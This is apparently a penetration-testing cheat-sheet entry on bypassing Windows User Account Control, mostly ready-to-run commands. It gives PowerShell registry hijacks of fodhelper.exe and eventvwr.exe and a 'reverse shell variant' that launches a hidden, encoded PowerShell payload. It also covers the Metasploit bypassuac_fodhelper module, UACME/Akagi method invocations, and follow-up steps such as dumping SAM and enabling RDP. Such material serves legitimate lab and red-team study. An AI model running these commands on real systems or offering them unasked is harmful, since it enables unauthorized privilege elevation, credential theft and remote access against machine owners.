---
id: windows-uac-bypass
title: UAC Bypass
stage: privesc
tags: [windows]
tools:
  - fodhelper UAC bypass (registry hijack)
  - eventvwr UAC bypass (registry hijack)
  - UACME project
leads_to: [system-shell, token-impersonation]
summary: Bypass User Account Control to elevate from medium to high integrity without triggering a UAC prompt — requires local admin group membership.
---

## Check Current Integrity Level

```powershell
whoami /groups | findstr "Mandatory Label"
# High Mandatory Level = already elevated
# Medium Mandatory Level = UAC bypass needed
```

## Fodhelper Bypass (Windows 10/11)

`fodhelper.exe` auto-elevates and reads `HKCU\Software\Classes\ms-settings\shell\open\command` without UAC prompt:

```powershell
# Set registry key to execute your payload
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
Set-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "cmd /c start cmd.exe" -Force
Set-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force

# Trigger fodhelper
Start-Process fodhelper.exe

# Clean up after
Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
```

Reverse shell variant:

```powershell
$cmd = "powershell -nop -w hidden -enc BASE64_PAYLOAD"
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
Set-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" "(default)" $cmd -Force
New-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" "DelegateExecute" "" -Force
Start-Process fodhelper.exe
```

## Eventvwr Bypass (Windows 7–10)

`eventvwr.exe` reads `HKCU\Software\Classes\mscfile\shell\open\command`:

```powershell
New-Item "HKCU:\Software\Classes\mscfile\Shell\Open\command" -Force
Set-ItemProperty "HKCU:\Software\Classes\mscfile\Shell\Open\command" "(default)" "cmd /c start cmd.exe" -Force
Start-Process eventvwr.exe
```

## Metasploit (Post Module)

```bash
# From an existing meterpreter session (medium integrity)
use post/multi/recon/local_exploit_suggester
# or directly:
use exploit/windows/local/bypassuac_fodhelper
set SESSION <id>
run
```

## UACME / Akagi

A comprehensive UAC bypass toolkit — over 60 bypass techniques indexed by Windows build:

```powershell
# Download Akagi64.exe (or compile from UACME source)
.\Akagi64.exe 23 C:\Windows\System32\cmd.exe   # method 23 = fodhelper
.\Akagi64.exe 41 "powershell -enc BASE64"        # method 41 = compmgmtlauncher
```

## Check UAC Level

```powershell
# Registry check
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
# 0 = no prompt (admin always elevated)
# 2 = prompt for credentials
# 5 = prompt for consent (default) ← bypassable
```

## Notes

- UAC bypass requires you to already be in the local Administrators group (medium integrity) — it's NOT a privilege escalation from standard user
- These techniques manipulate COM object hijacking via HKCU — no system-level write needed
- Windows Defender detects most of these; in lab environments they work reliably
- After UAC bypass, token integrity is High — you can then dump SAM, enable RDP, etc.
- Always clean up registry keys after exploitation

